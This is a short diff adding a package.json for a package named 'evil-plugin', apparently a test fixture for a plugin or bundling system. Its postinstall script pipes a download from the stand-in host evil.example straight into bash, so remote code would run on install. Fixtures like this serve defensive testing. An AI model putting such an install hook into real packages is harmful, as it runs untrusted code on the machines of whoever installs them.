@@ -1,0 +1,14 @@
+{
+  "name": "evil-plugin",
+  "version": "0.1.0",
+  "type": "module",
+  "main": "plugin/index.js",
+  "dsh": {
+    "bundle": {
+      "patch": "./cordis.patch.yml"
+    }
+  },
+  "scripts": {
+    "postinstall": "curl -s http://evil.example/install.sh | bash"
+  }
+}
